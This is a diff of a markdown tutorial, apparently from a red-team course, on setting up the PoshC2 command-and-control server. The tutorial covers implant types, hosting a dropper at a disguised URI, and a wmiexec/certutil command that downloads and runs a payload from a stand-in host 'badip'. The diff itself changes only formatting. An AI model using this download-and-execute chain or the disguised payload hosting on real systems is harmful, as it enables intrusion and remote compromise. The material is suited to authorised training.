@@ -1,4 +1,4 @@
-# Running PoshC2
+# Running Poshc2
 
 Create a new project:
 
@@ -21,7 +21,7 @@ posh-config
 Edit `payloadcoms` to your ip  
 Also edit Bindport form 443 to 80
 
-Launch the PoshC2 server:
+Launch the Poshc2 server:
 ```
 posh-server
 ```
@@ -39,11 +39,11 @@ For more on `Poshc2` github like [here](https://apple.stackexchange.com/question
 
 # Host Payloads 
 
-The PoshC2 Implant Types can be summarized as:
-* PS - PowerShell Implant.
-* C# - C# Implant that does not use System.Management.Automation.dll.
-* PY - Python Implant.
-* PB - PBind
+The Poshc2 Implant Types can be summarized as:
+* `PS` - PowerShell Implant.
+* `C#` - C# Implant that does not use System.Management.Automation.dll.
+* `PY` - Python Implant.
+* `PB` - PBind
 
 In the ImplantHandler run file upload command 
 ```
@@ -51,7 +51,7 @@ add-hosted-file
 ```
 
 Host file options 
-```
+```console
 file location > /var/poshc2/YourProjectName/payloads/Sharp_v4_dropper_x64.exe
 file uri > /en-us/readme.md
 file MIME type > text/html
@@ -164,7 +164,7 @@ add-hosted-file
 
 Host file opttions 
 
-```
+```console
 file location > /var/poshc2/projectname/payloads/Sharp_v4_dropper_x64.exe
 file uri > /verify
 file MIME type > text/html
@@ -172,7 +172,7 @@ Base64 > n
 ```
 
 Run wimc to get download and execution of hosted payload
-```
+```powershell
 wmiexec <127.0.0.1> <domain> <username> password=asdsa "cmd /c certutil.exe -urlcache -split -f http://badip/verify C:\windows\downloads\bad2.exe && C:\windows\downloads\bad2.exe"
 ```
 
@@ -199,4 +199,6 @@ Now lets download some files
 download-file <filename>
 ```
 
-Congratulations you have ran through your first OPPLAN, check [here](poshC2_help_v8.md) for the help list for poshc2 and other commands you can run.
+Congratulations you have ran through your first OPPLAN, check [here](poshc2_help_v8.md) for the help list for Poshc2 and other commands you can run.
+
+## [Return to course page](README.md) or [Go To Next Step](step2-proxy-nginx.md)
